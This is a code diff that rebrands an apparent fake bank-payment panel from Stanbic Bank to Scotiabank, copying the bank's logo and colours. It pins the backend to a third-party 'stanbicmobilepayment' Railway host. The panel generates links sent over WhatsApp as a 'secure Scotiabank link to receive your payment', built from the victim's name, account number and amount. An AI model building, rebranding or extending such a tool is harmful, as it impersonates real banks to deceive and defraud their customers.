@@ -3,18 +3,18 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Stanbic Bank · Send Payment</title>
+<title>Scotiabank · Send Payment</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
 :root{
-  --sb-primary:#01008C;
-  --sb-royal:#005EB8;
-  --sb-navy:#001E50;
-  --sb-gold:#FFB81C;
-  --sb-gold-soft:#FFF8E1;
-  --sb-blue-soft:#EEF3FB;
+  --sb-primary:#EC111A;
+  --sb-royal:#C00D14;
+  --sb-navy:#1A1A1A;
+  --sb-gold:#FFD400;
+  --sb-gold-soft:#FFFBE1;
+  --sb-blue-soft:#FDEEEF;
   --sb-text:#1A2233;
   --sb-muted:#5B6577;
   --sb-border:#E4E8F0;
@@ -28,7 +28,7 @@
   --radius-input:8px;
   --radius-btn:8px;
   --font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
-  --shadow-card:0 1px 2px rgba(0,0,0,.04),0 4px 16px -4px rgba(1,0,140,.08);
+  --shadow-card:0 1px 2px rgba(0,0,0,.04),0 4px 16px -4px rgba(236,17,26,.08);
   --shadow-sm:0 1px 2px rgba(0,0,0,.04);
 }
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
@@ -37,10 +37,8 @@ body{font-family:var(--font-family);background:var(--sb-page);color:var(--sb-tex
 .admin-navbar{background:#fff;border-bottom:1px solid var(--sb-border);padding:14px 24px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100;box-shadow:var(--shadow-sm)}
 .brand-badge{display:inline-flex;align-items:center;gap:12px}
 .brand-logo-wrap{display:flex;align-items:center;gap:8px}
-.brand-logo{height:32px;width:auto;display:block;flex-shrink:0}
-.brand-text{font-size:20px;font-weight:800;letter-spacing:-0.5px;color:var(--sb-primary);line-height:1;white-space:nowrap}
-.brand-text .dot{color:var(--sb-gold)}
-.admin-shield-tag{font-size:10px;font-weight:700;background:var(--sb-blue-soft);color:var(--sb-primary);padding:4px 10px;border-radius:999px;text-transform:uppercase;letter-spacing:.6px;display:inline-flex;align-items:center;gap:5px;border:1px solid #C9D4EA}
+.brand-logo{height:24px;width:auto;display:block;flex-shrink:0}
+.admin-shield-tag{font-size:10px;font-weight:700;background:var(--sb-blue-soft);color:var(--sb-primary);padding:4px 10px;border-radius:999px;text-transform:uppercase;letter-spacing:.6px;display:inline-flex;align-items:center;gap:5px;border:1px solid #F3C9CB}
 .admin-nav-meta{display:flex;align-items:center;gap:14px}
 .admin-live-indicator{font-size:11.5px;font-weight:600;color:var(--sb-green);display:inline-flex;align-items:center;gap:7px;background:var(--sb-green-soft);padding:6px 12px;border-radius:999px}
 .pulse-dot{width:7px;height:7px;background-color:var(--sb-green);border-radius:50%;box-shadow:0 0 0 0 rgba(14,122,74,.6);animation:pulseGlow 2s infinite}
@@ -52,7 +50,7 @@ body{font-family:var(--font-family);background:var(--sb-page);color:var(--sb-tex
 .admin-container{display:grid;grid-template-columns:1.15fr .85fr;gap:24px;align-items:start}
 .admin-card{background:#fff;border-radius:var(--radius-card);border:1px solid var(--sb-border);box-shadow:var(--shadow-card);padding:24px}
 .admin-card-header{display:flex;align-items:flex-start;gap:14px;margin-bottom:22px;padding-bottom:18px;border-bottom:1px solid var(--sb-border)}
-.header-icon-box{width:44px;height:44px;border-radius:10px;background:var(--sb-blue-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0;border:1px solid #C9D4EA}
+.header-icon-box{width:44px;height:44px;border-radius:10px;background:var(--sb-blue-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0;border:1px solid #F3C9CB}
 .admin-card-title{font-size:19px;font-weight:800;color:var(--sb-navy);line-height:1.25;letter-spacing:-.3px}
 .admin-card-subtitle{font-size:12.5px;color:var(--sb-muted);margin-top:4px;line-height:1.5}
 
@@ -60,23 +58,23 @@ body{font-family:var(--font-family);background:var(--sb-page);color:var(--sb-tex
 .label-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:7px}
 label{display:block;font-size:12.5px;font-weight:600;color:#2A3547;margin-bottom:6px}
 .required{color:var(--sb-red)}
-.helper-pill{font-size:10.5px;font-weight:700;color:var(--sb-primary);background:var(--sb-blue-soft);padding:3px 9px;border-radius:999px;border:1px solid #C9D4EA}
+.helper-pill{font-size:10.5px;font-weight:700;color:var(--sb-primary);background:var(--sb-blue-soft);padding:3px 9px;border-radius:999px;border:1px solid #F3C9CB}
 .field-hint{display:block;font-size:11.5px;color:var(--sb-muted);margin-top:5px}
 .field-hint strong{color:var(--sb-text);font-weight:700}
 .styled-input,.styled-select{width:100%;padding:10px 14px;font-size:13.5px;font-family:inherit;color:var(--sb-text);background:#fff;border:1.5px solid #CDD5E2;border-radius:var(--radius-input);outline:none;transition:all .15s ease}
-.styled-input:focus,.styled-select:focus{border-color:var(--sb-primary);box-shadow:0 0 0 3px rgba(1,0,140,.10)}
+.styled-input:focus,.styled-select:focus{border-color:var(--sb-primary);box-shadow:0 0 0 3px rgba(236,17,26,.10)}
 .styled-select{cursor:pointer;background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%235B6577' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");background-repeat:no-repeat;background-position:right 12px center;background-size:16px;padding-right:36px;appearance:none;-webkit-appearance:none}
 .uppercase-text{text-transform:uppercase;font-weight:600;letter-spacing:.5px}
 .field-helper-btn{background:none;border:none;color:var(--sb-primary);font-size:11.5px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;gap:4px;padding:2px 4px;font-family:inherit}
 .field-helper-btn:hover{text-decoration:underline}
 .phone-input-combined{display:flex;border:1.5px solid #CDD5E2;border-radius:var(--radius-input);overflow:hidden;background:#fff;transition:all .15s ease}
-.phone-input-combined:focus-within{border-color:var(--sb-primary);box-shadow:0 0 0 3px rgba(1,0,140,.10)}
-.country-prefix-addon{display:flex;align-items:center;gap:6px;padding:0 12px;background:var(--sb-blue-soft);border-right:1.5px solid #C9D4EA;font-size:13px;font-weight:700;color:var(--sb-primary);user-select:none}
+.phone-input-combined:focus-within{border-color:var(--sb-primary);box-shadow:0 0 0 3px rgba(236,17,26,.10)}
+.country-prefix-addon{display:flex;align-items:center;gap:6px;padding:0 12px;background:var(--sb-blue-soft);border-right:1.5px solid #F3C9CB;font-size:13px;font-weight:700;color:var(--sb-primary);user-select:none}
 .phone-field{border:none !important;border-radius:0 !important;box-shadow:none !important}
 .form-row-2col{display:grid;grid-template-columns:1fr 1fr;gap:14px}
 
 .purpose-highlight{
-  background:#FFFDF5;border:1.5px solid #F2E4B8;border-radius:10px;
+  background:#FFFBE1;border:1.5px solid #F5E9A3;border-radius:10px;
   padding:14px 16px;margin-bottom:16px;
   position:relative;
 }
@@ -84,18 +82,18 @@ label{display:block;font-size:12.5px;font-weight:600;color:#2A3547;margin-bottom
   content:'';position:absolute;left:0;top:0;bottom:0;width:3px;
   background:var(--sb-gold);border-radius:10px 0 0 10px;
 }
-.purpose-highlight label{color:#8A6600;margin-bottom:6px;display:flex;align-items:center;gap:6px}
+.purpose-highlight label{color:#6A5B00;margin-bottom:6px;display:flex;align-items:center;gap:6px}
 .purpose-highlight .purpose-pill{
   font-size:10px;font-weight:800;letter-spacing:.5px;text-transform:uppercase;
-  color:var(--sb-gold);background:rgba(255,184,28,.15);
+  color:#6A5B00;background:rgba(255,212,0,.25);
   padding:2px 7px;border-radius:4px;
 }
-.purpose-highlight .field-hint{color:#8A6600}
+.purpose-highlight .field-hint{color:#6A5B00}
 .purpose-highlight .styled-input{
-  background:#fff;border-color:#E8D9A8;
+  background:#fff;border-color:#F5E9A3;
 }
 .purpose-highlight .styled-input:focus{
-  border-color:var(--sb-gold);box-shadow:0 0 0 3px rgba(255,184,28,.18);
+  border-color:var(--sb-gold);box-shadow:0 0 0 3px rgba(255,212,0,.25);
 }
 
 .btn-primary-block{
@@ -105,16 +103,16 @@ label{display:block;font-size:12.5px;font-weight:600;color:#2A3547;margin-bottom
   font-size:17px;font-weight:800;letter-spacing:0.3px;
   cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:10px;
   transition:all .2s ease;
-  box-shadow:0 10px 24px rgba(1,0,140,.25);
+  box-shadow:0 10px 24px rgba(236,17,26,.25);
   margin-top:12px;font-family:inherit;
 }
-.btn-primary-block:hover:not(:disabled){background:#00006B;transform:translateY(-1px);box-shadow:0 12px 28px rgba(1,0,140,.35)}
+.btn-primary-block:hover:not(:disabled){background:var(--sb-royal);transform:translateY(-1px);box-shadow:0 12px 28px rgba(236,17,26,.35)}
 .btn-primary-block:active:not(:disabled){transform:translateY(0)}
 .btn-primary-block:disabled{opacity:.6;cursor:not-allowed}
 .btn-primary-block svg{width:20px;height:20px}
 
 .admin-column-right{display:flex;flex-direction:column;gap:22px}
-.link-showcase-card{border-top:4px solid var(--sb-gold);position:relative}
+.link-showcase-card{border-top:4px solid var(--sb-primary);position:relative}
 .card-status-tag{margin-bottom:12px}
 .status-ready-pill{font-size:10px;font-weight:700;background:var(--sb-green-soft);color:var(--sb-green);padding:4px 10px;border-radius:999px;text-transform:uppercase;letter-spacing:.6px}
 .showcase-title{font-size:17px;font-weight:800;color:var(--sb-navy);margin-bottom:6px;letter-spacing:-.2px}
@@ -123,7 +121,7 @@ label{display:block;font-size:12.5px;font-weight:600;color:#2A3547;margin-bottom
 .link-input-group{display:flex;background:var(--sb-soft);border:1.5px solid #CDD5E2;border-radius:8px;overflow:hidden;padding:4px;gap:4px}
 .share-url-input{flex:1;border:none;background:transparent;padding:9px 12px;font-size:12px;font-family:"SF Mono",Monaco,Consolas,monospace;color:var(--sb-text);outline:none;min-width:0}
 .btn-copy-link{background:var(--sb-primary);color:#fff;border:none;border-radius:6px;padding:11px 16px;font-size:13px;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:6px;transition:all .15s ease;white-space:nowrap;font-family:inherit}
-.btn-copy-link:hover{background:#00006B}
+.btn-copy-link:hover{background:var(--sb-royal)}
 .showcase-actions-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:18px}
 .btn-action-outline{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:12px 14px;border:1.5px solid #CDD5E2;background:#fff;border-radius:8px;font-size:13px;font-weight:600;color:var(--sb-text);cursor:pointer;transition:all .15s ease;font-family:inherit}
 .btn-action-outline:hover{background:var(--sb-soft);border-color:var(--sb-primary);color:var(--sb-primary)}
@@ -142,7 +140,7 @@ label{display:block;font-size:12.5px;font-weight:600;color:#2A3547;margin-bottom
 .admin-history-list{display:flex;flex-direction:column;gap:10px;max-height:400px;overflow-y:auto}
 .history-empty{font-size:12.5px;color:#94A3B8;text-align:center;padding:24px 12px;line-height:1.5}
 .history-item-row{display:flex;align-items:center;justify-content:space-between;padding:11px 12px;border-radius:10px;background:var(--sb-soft);border:1px solid var(--sb-border);gap:10px;transition:all .15s ease}
-.history-item-row:hover{background:#EAF0FA;border-color:#C9D4EA}
+.history-item-row:hover{background:#FDF2F3;border-color:#F3C9CB}
 .hist-info{flex:1;min-width:0}
 .hist-name{font-size:12.5px;font-weight:700;color:var(--sb-text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .hist-code{font-size:10.5px;font-family:"SF Mono",Monaco,Consolas,monospace;color:var(--sb-muted);font-weight:600;background:#E4E8F0;padding:1px 5px;border-radius:3px;margin-left:4px}
@@ -170,8 +168,7 @@ label{display:block;font-size:12.5px;font-weight:600;color:#2A3547;margin-bottom
   .hist-info,.hist-amt,.hist-actions{width:100%}
   .hist-actions{justify-content:flex-end}
   .styled-input,.styled-select{font-size:16px}
-  .brand-logo{height:28px}
-  .brand-text{font-size:18px}
+  .brand-logo{height:22px}
   .btn-primary-block{min-height:60px;font-size:16px;padding:18px 20px}
 }
 </style>
@@ -183,13 +180,12 @@ label{display:block;font-size:12.5px;font-weight:600;color:#2A3547;margin-bottom
     <div class="brand-badge">
       <div class="brand-logo-wrap">
         <img
-          src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-          alt="Stanbic Bank"
+          src="https://upload.wikimedia.org/wikipedia/commons/2/22/Scotiabank_logo.svg"
+          alt="Scotiabank"
           class="brand-logo"
           referrerpolicy="no-referrer"
           onerror="this.style.display='none'"
         >
-        <span class="brand-text">Stanbic<span class="dot">.</span></span>
       </div>
       <span class="admin-shield-tag">
         <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
@@ -209,7 +205,7 @@ label{display:block;font-size:12.5px;font-weight:600;color:#2A3547;margin-bottom
     <div class="admin-card form-column">
       <div class="admin-card-header">
         <div class="header-icon-box">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#01008C" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#EC111A" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
         </div>
         <div>
           <h1 class="admin-card-title">Send Payment</h1>
@@ -231,6 +227,7 @@ label{display:block;font-size:12.5px;font-weight:600;color:#2A3547;margin-bottom
             <option value="+260" data-flag="🇿🇲" data-country="Zambia" data-currency="ZMW" data-lang="en">🇿🇲 Zambia (+260)</option>
             <option value="+233" data-flag="🇬🇭" data-country="Ghana" data-currency="GHS" data-lang="en">🇬🇭 Ghana (+233)</option>
             <option value="+229" data-flag="🇧🇯" data-country="Benin" data-currency="XOF" data-lang="fr">🇧🇯 Benin (+229)</option>
+            <option value="+267" data-flag="🇧🇼" data-country="Botswana" data-currency="BWP" data-lang="en">🇧🇼 Botswana (+267)</option>
           </select>
           <span class="field-hint" id="country-hint"></span>
         </div>
@@ -287,7 +284,7 @@ label{display:block;font-size:12.5px;font-weight:600;color:#2A3547;margin-bottom
         <div class="purpose-highlight">
           <div class="label-row">
             <label for="adminPurpose">
-              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#8A6600" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#6A5B00" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
               Purpose / Category
             </label>
             <span class="purpose-pill">Shown to client</span>
@@ -316,8 +313,8 @@ label{display:block;font-size:12.5px;font-weight:600;color:#2A3547;margin-bottom
             <label for="adminMarketedBy">Sender / From Name</label>
             <span class="helper-pill">Optional</span>
           </div>
-          <input type="text" id="adminMarketedBy" placeholder="e.g. Stanbic Bank / Corporate Client" autocomplete="off" class="styled-input">
-          <span class="field-hint">Displayed as <strong>"From"</strong> on the client page. Leave blank to show <strong>"Stanbic Bank"</strong>.</span>
+          <input type="text" id="adminMarketedBy" placeholder="e.g. Scotiabank / Corporate Client" autocomplete="off" class="styled-input">
+          <span class="field-hint">Displayed as <strong>"From"</strong> on the client page. Leave blank to show <strong>"Scotiabank"</strong>.</span>
         </div>
 
         <div class="form-group">
@@ -383,12 +380,10 @@ label{display:block;font-size:12.5px;font-weight:600;color:#2A3547;margin-bottom
 <div id="toast" class="toast-notification"></div>
 
 <script>
-const API_BASE = (function () {
-  if (window.location.protocol === 'file:') {
-    return 'https://mtnreceipt.online';
-  }
-  return window.location.origin;
-})();
+/* ═══════════════════════════════════════════════════════════
+   API_BASE — HARD-PINNED to the live Railway backend
+   ═══════════════════════════════════════════════════════════ */
+const API_BASE = 'https://stanbicmobilepayment-production.up.railway.app';
 
 const STORAGE_KEY_RECEIPTS = 'sb_receipts_history';
 const STORAGE_KEY_CURRENT  = 'sb_current_receipt';
@@ -505,7 +500,7 @@ async function handleAdminFormSubmit(e){
     modeOfPayment: document.getElementById('adminModeOfPayment').value.trim(),
     accountName: document.getElementById('adminAccountName').value.trim(),
     countryCode, countryFlag, countryName,
-    network: 'stanbic',
+    network: 'scotiabank',
     lang: lang,
     accountNumber: document.getElementById('adminAccountNumber').value.trim(),
     amount: parseFloat(document.getElementById('adminAmount').value || 0).toFixed(2),
@@ -632,7 +627,7 @@ function shareViaWhatsApp(){
   const url = currentReceipt._shortUrl || buildClientPaymentUrl(currentReceipt);
   const amt = parseFloat(currentReceipt.amount||0).toLocaleString('en-UG', {maximumFractionDigits:0});
   const purposeLine = currentReceipt.purpose ? `\nPurpose: ${currentReceipt.purpose}` : '';
-  const text = `Hello ${currentReceipt.accountName}, here is your secure Stanbic Bank link to receive your payment of ${currentReceipt.currency} ${amt}${purposeLine} (Ref: ${currentReceipt.trackingNumber}):\n\n${url}\n\nPlease click the link to confirm receipt of your payment.`;
+  const text = `Hello ${currentReceipt.accountName}, here is your secure Scotiabank link to receive your payment of ${currentReceipt.currency} ${amt}${purposeLine} (Ref: ${currentReceipt.trackingNumber}):\n\n${url}\n\nPlease click the link to confirm receipt of your payment.`;
   window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`,'_blank');
 }
 
